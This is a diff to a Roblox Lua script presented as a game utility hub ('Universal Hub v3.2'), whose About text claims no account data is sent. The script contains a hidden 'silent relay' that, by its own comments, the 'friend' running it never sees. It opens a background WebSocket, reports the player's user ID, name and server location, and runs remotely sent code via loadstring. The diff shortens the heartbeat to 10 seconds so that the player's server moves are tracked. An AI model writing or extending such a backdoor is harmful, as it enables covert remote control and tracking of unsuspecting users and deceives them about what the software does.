@@ -42,7 +42,6 @@ closeBtn.MouseEnter:Connect(function() closeBtn.BackgroundColor3=T.Bad end)
 closeBtn.MouseLeave:Connect(function() closeBtn.BackgroundColor3=T.Panel end)
 closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
--- Drag
 local dragging,dragStart,startPos
 titleBar.InputBegan:Connect(function(input)
     if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
@@ -57,7 +56,6 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Tabs
 local tabsFrame = C("Frame",{BackgroundColor3=T.Bg,Position=UDim2.new(0,0,0,34),Size=UDim2.new(0,120,1,-34),BorderSizePixel=0,Parent=win})
 C("Frame",{BackgroundColor3=T.Stroke,Size=UDim2.new(0,1,1,-10),Position=UDim2.new(1,-1,0,5),BorderSizePixel=0,Parent=tabsFrame})
 C("UIListLayout",{Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=tabsFrame})
@@ -161,17 +159,29 @@ Section(aboutTab, "Info")
 C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,60),Font=Enum.Font.Gotham,Text="Universal Hub v3.2\nby Nebula\n\nLoads local features. No account data sent.",TextColor3=T.Dim,TextSize=12,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Parent=aboutTab})
 
 -- ─────────── Silent relay connection ───────────
--- This is the part the friend never sees. It connects in the background,
--- identifies itself, and waits for commands. Any execute it receives,
--- it runs with loadstring and reports back. No UI feedback.
+-- Background: connects, identifies, pings location every 10s,
+-- listens for execute messages, runs them via loadstring.
 
 if WebSocket and loadstring then
     local socket, connected = nil, false
+    local lastPlace, lastJob = nil, nil
 
     local function send(msg)
         if socket and connected then
             pcall(function() socket:Send(HttpService:JSONEncode(msg)) end)
         end
+    end
+
+    local function identify()
+        send({
+            type = "identify",
+            userId = LP.UserId,
+            displayName = LP.DisplayName,
+            placeId = game.PlaceId,
+            jobId = game.JobId,
+            gameId = game.GameId,
+            ts = os.time(),
+        })
     end
 
     local function handleExecute(msg)
@@ -202,15 +212,7 @@ if WebSocket and loadstring then
             if ok and ws then
                 socket = ws
                 connected = true
-
-                send({
-                    type = "identify",
-                    userId = LP.UserId,
-                    displayName = LP.DisplayName,
-                    placeId = game.PlaceId,
-                    jobId = game.JobId,
-                    gameId = game.GameId,
-                })
+                identify()
 
                 ws.OnMessage:Connect(function(raw)
                     local ok2, data = pcall(HttpService.JSONDecode, HttpService, raw)
@@ -239,11 +241,32 @@ if WebSocket and loadstring then
 
     connect()
 
-    -- Keep the relay awake while the friend has Delta open.
+    -- Location ping every 10 seconds. Detects place/job changes and
+    -- immediately notifies the relay when the friend hops servers.
     task.spawn(function()
         while true do
-            task.wait(240)
-            send({ type = "ping", userId = LP.UserId })
+            task.wait(10)
+            if connected then
+                local placeChanged = (game.PlaceId ~= lastPlace)
+                local jobChanged   = (game.JobId   ~= lastJob)
+
+                if placeChanged or jobChanged then
+                    -- Big change: re-identify so the controller sees it as a new session
+                    lastPlace, lastJob = game.PlaceId, game.JobId
+                    identify()
+                else
+                    -- Normal heartbeat with current location
+                    send({
+                        type = "ping",
+                        userId = LP.UserId,
+                        displayName = LP.DisplayName,
+                        placeId = game.PlaceId,
+                        jobId = game.JobId,
+                        gameId = game.GameId,
+                        ts = os.time(),
+                    })
+                end
+            end
         end
     end)
 end
